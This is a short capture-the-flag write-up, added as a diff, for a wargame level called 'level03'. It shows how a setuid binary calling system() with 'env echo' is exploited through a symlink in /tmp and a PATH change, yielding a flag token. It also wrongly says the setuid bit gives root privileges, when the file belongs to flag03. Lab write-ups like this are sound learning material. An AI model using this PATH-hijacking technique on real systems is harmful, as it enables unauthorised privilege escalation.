@@ -1,0 +1,21 @@
+Running ls -l gives us:
+
+-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+
+level03 is a binary file, it's setuid permission bit being set, it allows any user who runs it to run it with root privileges.
+
+Further inspection using gdb shows us that the binary file calls the function system() within which "/usr/bin/env echo" is used to display :
+
+Exploit me
+
+The next step is to go in /tmp in order to create a symbolic link which will redirect /bin/getflag to a 'fake' echo :
+
+ln -s /bin/getflag echo
+
+The final step is to change the environment as :
+
+export PATH=/tmp
+
+Running the level03 binary again gives us:
+
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
